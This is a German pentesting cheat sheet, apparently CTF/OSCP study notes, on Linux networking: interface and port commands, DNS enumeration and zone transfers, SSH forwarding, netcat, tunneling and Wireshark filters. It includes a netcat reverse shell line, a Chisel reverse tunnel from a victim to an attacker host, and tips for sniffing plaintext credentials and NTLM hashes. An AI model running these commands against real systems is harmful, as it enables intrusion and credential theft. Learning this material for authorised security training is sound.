# Linux Networking

## IP & Interfaces

```bash
ip a                          # alle Interfaces + IP-Adressen
ip addr show eth0             # spezifisches Interface
ifconfig                      # alternative (ältere Systeme)
ip route                      # Routing-Tabelle
ip neigh                      # ARP-Tabelle (bekannte Hosts)
```

## Verbindungen & offene Ports

```bash
ss -tulpn                     # alle offenen Ports + Prozesse
netstat -tulpn                # alternative (ältere Systeme)
netstat -ano                  # alle Verbindungen mit PID
ss -s                         # Zusammenfassung
lsof -i :80                   # welcher Prozess nutzt Port 80
```

## DNS

```bash
host -t ns megacorpone.com              # Name Server suchen
host -t mx megacorpone.com              # Mail Server suchen
host -t a megacorpone.com               # A-Record (IP)
host -l megacorpone.com ns1.megacorpone.com   # Zone Transfer versuchen

# dnsrecon – DNS Zone Transfer
dnsrecon -d megacorpone.com -t axfr

# dnsenum – DNS Enumeration
dnsenum th-deg.de

# nslookup
nslookup megacorpone.com
nslookup -type=NS megacorpone.com
```

## SSH

```bash
ssh user@10.10.10.10                     # SSH Login
ssh -i id_rsa user@10.10.10.10          # Login mit Key
ssh -p 2222 user@10.10.10.10            # anderer Port
ssh -L 8080:localhost:80 user@10.10.10.10   # Local Port Forwarding
ssh -R 4444:localhost:4444 user@10.10.10.10 # Remote Port Forwarding
ssh -D 9050 user@10.10.10.10            # Dynamic (SOCKS Proxy)
chmod 600 id_rsa                        # Key-Berechtigungen setzen (notwendig!)
```

## Netcat (nc)

```bash
nc -nlvp 4444                 # Listener starten (-n no DNS, -l listen, -v verbose, -p port)
nc -nv 10.10.10.10 4444       # verbinden
nc -nv 10.10.10.10 21         # Banner Grabbing (FTP)
nc 10.10.10.10 443 -e /bin/bash   # Reverse Shell (mit -e)

# Datei übertragen
# Empfänger:
nc -nlvp 4444 > datei.exe
# Sender:
nc -nv 10.10.10.10 4444 < datei.exe
```

## Nmap (siehe auch 05_Information_Gathering.md)

```bash
nmap -sn 10.10.10.0/24        # Host Discovery (Ping Scan)
nmap -sS -sV -A 10.10.10.10  # Standard Scan
```

## Tunneling & Pivoting

```bash
# Proxychains
proxychains nmap -sT 10.10.10.10          # Tool über Proxy tunneln
# Konfiguration: /etc/proxychains.conf → socks5 127.0.0.1 9050

# SSH Dynamic (SOCKS Proxy)
ssh -D 9050 -f -N user@10.10.10.10
# dann in /etc/proxychains.conf: socks5 127.0.0.1 9050

# Chisel – Tunneling (wenn SSH nicht möglich)
# Kali (Server):
chisel server --reverse --port 9001
# Opfer (Client):
chisel client <attacker-ip>:9001 R:socks

# sshuttle – VPN über SSH
sshuttle -r user@10.10.10.10 10.10.10.0/24

# socat – Port Forwarding
socat TCP-LISTEN:4444,fork TCP:10.10.10.10:4444
```

## Wireshark – Netzwerkanalyse

**Wann nutzen?**
- PCAP-Dateien in CTFs analysieren
- Credentials im Klartext finden (FTP, HTTP, Telnet)
- Protokolle verstehen / Traffic analysieren
- NTLM Hashes im Traffic fangen

```wireshark
# Nach IP filtern
ip.addr == 10.10.10.10
ip.src == 10.10.10.10
ip.dst == 10.10.10.10

# Nach Port/Protokoll
tcp.port == 21
tcp.port == 80
udp.port == 53
http
ftp
smb
dns
telnet

# TCP Flags
tcp.flags.syn == 1                           # SYN Pakete
tcp.flags.syn == 1 && tcp.flags.ack == 0    # Port Scan erkennen
tcp.flags.reset == 1                         # Port geschlossen

# HTTP
http.request.method == "POST"               # Login-Daten!
http.response.code == 200
http contains "password"

# Kombination
ip.addr == 10.10.10.10 && tcp.port == 80
```

**Wichtige Features:**
```
Follow TCP Stream   → Rechtsklick → "Follow" → "TCP Stream"
                      Zeigt komplette Konversation (z.B. Klartext-Login bei FTP/HTTP)

Statistics → Protocol Hierarchy   → welche Protokolle genutzt werden
Statistics → Conversations         → wer kommuniziert mit wem
Edit → Find Packet → String        → nach Keywords suchen (password, flag)
File → Export Objects → HTTP       → alle HTTP-Dateien exportieren
```

**Credentials finden:**
```
FTP    → Klartext → "USER" und "PASS" direkt sichtbar
HTTP   → POST Body → Follow TCP Stream
Telnet → Klartext → Follow TCP Stream
SMB    → NTLM Hash → mit Responder fangen
```
